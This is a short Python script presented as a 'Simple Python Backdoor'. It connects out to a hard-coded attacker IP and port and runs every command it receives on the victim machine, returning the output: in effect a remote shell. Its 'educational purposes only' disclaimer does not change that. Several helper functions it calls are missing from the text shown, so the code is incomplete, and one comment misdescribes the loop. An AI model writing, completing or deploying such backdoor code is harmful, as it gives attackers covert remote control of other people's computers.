#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# ----------------------------------------------------
# This program is for educational purposes only!
# I am not responsible for anything you do with it.
# ----------------------------------------------------

# Imports
import base64
import platform
import socket
import subprocess
import sys
import time

# Variables
IP = '192.168.0.106'
PORT = 33434
CHUNKS = 2048


def main():
    _socket = simple_python_backdoor_client_connect()
    _socket.send(b'\n<==========Simple Python Backdoor=========>\n\n')

    # Infinite loop until socket can connect.
    while True:
        data = base64_decode(_socket.recv(CHUNKS))
        str_data = data.decode()

        if 'exit' in str_data:
            _socket.close()
            sys.exit(0)
        elif 'uname' in str_data:
            _socket.send(uname().encode())

        output = run_command(str_data)
        _socket.send(output)


if __name__ == '__main__':
    main()
